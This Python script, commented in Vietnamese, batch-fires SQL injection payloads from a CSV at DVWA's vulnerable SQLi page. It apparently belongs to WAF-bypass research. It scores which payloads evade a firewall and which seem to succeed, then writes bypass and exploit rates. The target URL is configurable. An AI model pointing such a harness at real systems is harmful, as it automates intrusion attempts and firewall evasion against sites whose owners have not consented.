import pandas as pd
import sqlparse
import psutil
import requests
import logging
import argparse
import os
from collections import Counter
from typing import Dict, List, Any
from urllib.parse import unquote
from concurrent.futures import ThreadPoolExecutor
import time


# Cấu hình logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler("../log/attack_log.txt"),
        logging.StreamHandler(),
    ],
)

# Phân loại payload SQLi
def classify_payload(payload: str) -> str:
    """Phân loại payload dựa trên ngữ pháp EBNF."""
    pl = unquote(payload).lower()
    
    if "union" in pl and "select" in pl:
        return "unionAtk"
    
    if any(func in pl for func in ["updatexml", "extractvalue", "floor(", "exp(", "name_const(", "geometrycollection(", "multipoint(", "polygon(", "linestring("]):
        return "errorAtk"
    
    if any(x in pl for x in [";", "--", "#", "sleep(", "pg_sleep(", "benchmark(", "waitfor delay"]):
        return "piggyAtk"
    
    if ("and" in pl or "or" in pl) and any(op in pl for op in ["=", ">", "<", "like", "is null", "is not null"]):
        if ("1=1" in pl or "1=0" in pl or "true" in pl or "false" in pl):
            return "booleanAtk"
            
    return "Unknown"

# Kiểm tra tính hợp lệ syntax
def verify_semantic_preservation(payload: str) -> bool:
    """
    Kiểm tra xem payload có phải là một chuỗi SQL có cú pháp hợp lệ hay không.
    Hàm này không kiểm tra các dấu hiệu tấn công SQLi, chỉ kiểm tra tính hợp lệ về mặt cú pháp.
    """
    try:
        parsed = sqlparse.parse(payload)
        if not parsed or parsed[0].get_type() == "UNKNOWN":
            return False
        return True
    except Exception:
        return False

# Hàm thực hiện tấn công
def attack_payload(payload: str, url: str, headers: Dict, method: str = "GET") -> Dict:
    """Thực hiện tấn công với một payload và trả về kết quả."""

    start_time = time.time()
    process = psutil.Process()
    mem_before = process.memory_info().rss / 1024 / 1024  # MB
    response_code = None
    content = ""
    elapsed_time = 0.0

    try:
        if method == "POST":
            response = requests.post(url, data={"id": payload, "Submit": "Submit"}, headers=headers, timeout=10)
        else:
            response = requests.get(url, params={"id": payload, "Submit": "Submit"}, headers=headers, timeout=10)
        
        response_code = response.status_code
        content = response.text.lower()
        elapsed_time = response.elapsed.total_seconds()

        # Xác định trạng thái bypass
        blocked_codes = [403, 406, 429, 503] # 406, 429, 503
        is_blocked = response_code in blocked_codes or any(x in content for x in ["waf", "blocked"]) or "X-WAF" in response.headers

        # Xác định khai thác thành công
        is_exploited = False
        exploit_type = "None"
        # UnionAtk: Kiểm tra dữ liệu nhạy cảm
        if any(x in content for x in ["user_id", "username", "password", "email", "hash", "session_id", "cookie"]):  # Từ khóa đặc trưng
            is_exploited = True
            exploit_type = "Yes (unionAtk)"
        # ErrorAtk: Kiểm tra thông tin cơ sở dữ liệu
        elif any(x in content for x in ["mysql", "version", "database", "sql syntax", "error in your sql syntax", "warning:"]):
            is_exploited = True
            exploit_type = "Yes (errorAtk)"
        # PiggyAtk: Dựa trên thời gian hoặc câu lệnh phụ
        elif elapsed_time > 5 or any(x in content for x in ["affected rows", "query executed"]):
            is_exploited = True
            exploit_type = "Yes (piggyAtk)"
        # BooleanAtk: Kiểm tra thay đổi logic (giả định cần so sánh với payload khác)
        elif "true" in content and "error" not in content and "false" not in content:
            is_exploited = True
            exploit_type = "Yes (booleanAtk)"

        # Kiểm tra ngữ nghĩa
        semantic_preserved = verify_semantic_preservation(payload)

        # Phân loại payload ban đầu
        payload_classification = classify_payload(payload)

        end_time = time.time()
        mem_after = process.memory_info().rss / 1024 / 1024

        return {
            "Payload": payload,
            "Status": "Blocked" if is_blocked else "Bypassed",
            "Exploit Success": "Yes" if exploit_type != "None" else "No",
            "Exploit Types": exploit_type, # Liệt kê các loại nếu có
            "Payload Type": payload_classification, # Đổi tên cho rõ ràng hơn
            "Response Time (s)": round(elapsed_time, 4),
            "Memory Usage (MB)": round((mem_before + mem_after) / 2, 2), # Làm tròn để dễ đọc
            "Semantic Preserved": "Yes" if semantic_preserved else "No",
            "Response Code": response_code,
            "Snippet": content[:500] if len(content) > 500 else content # Tăng snippet lên 500 ký tự
        }
    
    except requests.RequestException as e:
        end_time = time.time()
        mem_after = process.memory_info().rss / 1024 / 1024
        return {
            "Payload": payload,
            "Status": f"Error: {type(e).__name__} - {str(e)}", # Mô tả lỗi rõ ràng hơn
            "Exploit Success": "No",
            "Exploit Types": ["None"],
            "Payload Type": classify_payload(payload),
            "Response Time (s)": 0,
            "Memory Usage (MB)": round((mem_before + mem_after) / 2, 2),
            "Semantic Preserved": "No",
            "Response Code": response_code, # Có thể là None nếu lỗi xảy ra trước khi nhận được status_code
            "Snippet": ""
        }

# Hàm chính
def main(
        input_file: str, 
        save_dir: str, 
        txt_out_len: int, 
        php_session_id: str, 
        url: str = "http://localhost/DVWA/vulnerabilities/sqli/?id=", 
        security_level: str = "low"
        ) -> None:
    """Chạy quá trình tấn công và lưu kết quả."""

    # Tạo thư mục nếu chưa tồn tại
    os.makedirs(save_dir, exist_ok=True)

    # Định nghĩa đường dẫn file đầu ra với txt_out_len
    dataset_file = os.path.join(save_dir, f"dataset_for_payload_length_{txt_out_len}.csv")
    summary_file = os.path.join(save_dir, f"attack_summary_for_payload_length_{txt_out_len}.txt")

    # Đọc file input
    try:
        df = pd.read_csv(input_file)
        payloads = df["transformed_payload"].tolist()
    except Exception as e:
        logging.error(f"Error reading input file {input_file}: {e}")
        return

    # Cấu hình tấn công
    headers = {"Cookie": f"security={security_level}; PHPSESSID={php_session_id}"}
    results: List[Dict] = []
    bypass_count = 0
    exploit_success_count = 0
    semantic_preserved_count = 0
    payload_types = Counter()
    unique_bypass_payloads = set()
    total_response_time = 0.0
    total_memory_usage = 0.0
    valid_payloads = 0

    # Thực hiện tấn công theo batch để tối ưu hiệu suất
    batch_size = 50

    # Hàm thực hiện tấn công theo batch
    def attack_batch(batch_payloads_list: List[str]) -> List[Dict[str, Any]]:
        batch_results_list = []
        for p in batch_payloads_list:
            # Truyền các tham số cần thiết vào attack_payload
            # Giả định attack_payload_improved là hàm đã cải tiến trước đó
            batch_results_list.append(attack_payload(p, url, headers))
        return batch_results_list
    
    # Thực hiện tấn công song song
    with ThreadPoolExecutor(max_workers=10) as executor:
        # Tạo danh sách các futures cho từng batch
        futures = [executor.submit(attack_batch, payloads[i:i + batch_size]) for i in range(0, len(payloads), batch_size)]
        for future in futures:
            try:
                batch_results = future.result()
                results.extend(batch_results)

                for result in batch_results:
                    if "Error" not in result["Status"]:
                        valid_payloads += 1
                    if result["Status"] == "Bypassed":
                        bypass_count += 1
                        unique_bypass_payloads.add(result["Payload"])
                    if "Yes" in result["Exploit Success"]:
                        exploit_success_count += 1
                    if result["Semantic Preserved"] == "Yes":
                        semantic_preserved_count += 1
                    payload_types[result["Payload Type"]] += 1
                    total_response_time += result["Response Time (s)"]
                    total_memory_usage += result["Memory Usage (MB)"]
                    logging.info(
                            f"Payload: {result['Payload']} | Status: {result['Status']} | "
                            f"Exploit: {result['Exploit Success']} | Type: {result['Payload Type']} | "
                            f"Time: {result['Response Time (s)']:.4f}s | Memory: {result['Memory Usage (MB)']:.2f}MB"
                        )
            except Exception as e:
                logging.error(f"Error in future result: {e}")

    # Thống kê
    total_payloads_sent = len(payloads)
    bypass_rate = (bypass_count / valid_payloads * 100) if valid_payloads > 0 else 0
    exploit_rate = (exploit_success_count / valid_payloads * 100) if valid_payloads > 0 else 0
    non_repetition_rate = (len(unique_bypass_payloads) / bypass_count * 100) if bypass_count > 0 else 0
    semantic_preservation_rate = (semantic_preserved_count / total_payloads_sent * 100) if total_payloads_sent > 0 else 0
    avg_time_per_payload = total_response_time / valid_payloads if valid_payloads > 0 else 0
    avg_memory_per_payload = total_memory_usage / valid_payloads if valid_payloads > 0 else 0


    # Lưu kết quả
    df_results = pd.DataFrame(results)
    df_results.to_csv(dataset_file, index=False)
    logging.info(f"===> Results saved to {dataset_file}")

    with open(summary_file, "w") as f:
        f.write(f"<========== Attack Summary ==========>\n")
        f.write(f"Total Payloads Sent: {total_payloads_sent}\n")
        f.write(f"Valid Payloads (No Errors): {valid_payloads}\n")
        f.write(f"Payloads Bypassed WAF/IDS (True Positive): {bypass_count}\n")
        f.write(f"Payloads Exploited Successfully: {exploit_success_count}\n")
        f.write(f"\n<========== Performance Metrics ==========>\n")
        f.write(f"Bypass Rate (Effective Rate): {bypass_rate:.2f}% (of valid payloads)\n")
        f.write(f"Successful Exploit Rate: {exploit_rate:.2f}% (of valid payloads)\n")
        f.write(f"Non-Repetition Rate (NRR): {non_repetition_rate:.2f}% (of bypassed payloads)\n")
        f.write(f"Semantic Preservation Rate (SPR): {semantic_preservation_rate:.2f}% (of total payloads sent)\n")
        f.write(f"Average Response Time per Processed Payload: {avg_time_per_payload:.4f} seconds\n")
        f.write(f"Average Memory Usage per Processed Payload: {avg_memory_per_payload:.2f} MB\n")
        f.write(f"Most Effective Payload Type: {payload_types.most_common(1)[0][0] if payload_types else 'None'} "
                f"(Count: {payload_types.most_common(1)[0][1] if payload_types else 0})\n")
        f.write(f"Payload Type Distribution:\n")
        for ptype, count in payload_types.most_common():
            f.write(f"  {ptype}: {count} ({count/total_payloads_sent*100:.2f}%)\n")
    logging.info(f"=====> Summary saved to {summary_file}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Perform SQL injection attack on DVWA")
    parser.add_argument("--input_file", type=str, required=True, help="Path to input CSV file")
    parser.add_argument("--save_dir", type=str, required=True, help="Directory to save results")
    parser.add_argument("--txt_out_len", type=int, required=True, help="Length of the output payload")
    parser.add_argument("--php_session_id", type=str, required=True, help="Session ID of DVWA")
    parser.add_argument("--url", type=str, default="http://localhost/DVWA/vulnerabilities/sqli/?id=", help="Target URL")
    parser.add_argument("--security_level", type=str, default="low", help="DVWA security level")
    args = parser.parse_args()
    main(args.input_file, args.save_dir, args.txt_out_len, args.php_session_id, args.url, args.security_level)